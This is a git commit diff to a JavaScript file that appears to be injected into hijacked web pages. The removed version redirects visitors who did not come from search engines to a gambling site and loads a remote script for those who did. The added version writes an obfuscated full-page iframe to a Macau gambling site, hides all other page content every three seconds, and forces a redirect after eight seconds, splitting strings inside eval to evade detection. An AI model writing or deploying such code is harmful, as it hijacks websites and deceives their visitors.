9f981a7ad1182cace59b7a348441a108f9aac7cc
js999999999 <js-9@outlook.com>
2017-06-20 13:10:35 +0800

    Update tt2.js

--- 2017hh/tt2.js
+++ 2017hh/tt2.js
@@ -1,11 +1,28 @@
-today=new Date();
-today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
-var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
-var where =document.referrer;
-if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count47.51yes.com/click.aspx?id=470070323&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/2017hh/t.js "></script></div>');
-}
-else
-{
-window.location.href="http://www.24499.com/#永利（特码48.5倍）";
-}
+document.write ('<script language="javascript" type="text/javascript" src="http://count47.51yes.com/click.aspx?id=470070323&logo=12" charset="gb2312"></script>');
+
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="123'+'50" src="http://www.24499.com/#澳门永利（特码48.5倍）"></iframe></center>';
+eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
+	
+try{
+	setInterval(function(){
+
+		try{
+			document.getElementById("div"+"All").style.display="no"+"ne";
+		}catch(e){}
+
+		for(var i=0;i<document.body.children.length;i++){
+			try{
+				var tagname = document.body.children[i].tagName;
+				var myid = document.body.children[i].id;
+				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+				  // if(tagname!="center"){ 
+				     document.body.children[i].style.display="non"+"e";
+				   //}
+				}
+			}catch(e){}
+		}
+
+	},3000);
+}catch(e){}
+
+window.setTimeout("window.location='http://www.24499.com/#澳门永利（特码48.5倍）'",8000);
